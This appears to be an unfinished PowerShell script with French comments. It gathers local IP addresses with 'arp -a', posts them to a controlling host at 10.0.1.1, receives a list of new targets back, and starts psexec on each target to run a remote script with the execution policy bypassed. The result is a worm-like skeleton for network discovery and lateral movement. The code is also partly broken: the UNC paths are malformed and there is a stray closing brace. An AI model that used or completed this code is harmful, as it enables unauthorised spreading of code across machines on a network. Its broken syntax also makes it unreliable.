# Exécuter la commande arp -a et stocker le résultat dans une variable
$arpResult = arp -a

# Extraire les adresses IP du résultat et les stocker dans une variable
$ipAddresses = $arpResult -split "`n" | Where-Object { $_ -match "\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}" } | ForEach-Object { $_.Trim().Split(" ")[0] }

# Convertir la liste d'adresses IP en objet JSON
$jsonData = $ipAddresses | ConvertTo-Json

# Envoyer les adresses IP au format JSON à l'adresse spécifiée
Invoke-WebRequest -Uri "http://10.0.1.1/dl" -Method POST -Body $jsonData -ContentType "application/json"

# Attendre 5 secondes
Start-Sleep -Seconds 5

# Obtenir le body en JSON de l'URL spécifiée
$response = Invoke-WebRequest -Uri "http://10.0.1.1/new" -Method GET -ContentType "application/json"

# Convertir le JSON en objet PowerShell et extraire les nouvelles adresses IP
$newIPs = $response.Content | ConvertFrom-Json

# Ici on va lancer la commande psexec sur chacune des nouvelles IPs, faut encore voir comment ça fonctionne
$newIPs | ForEach-Object {
# Remplir cette partie avec psexec blabla
psexec -s \$_ Powershell -ExecutionPolicy Bypass -File \10.10.3.30\scripts\script.ps1
    }
}
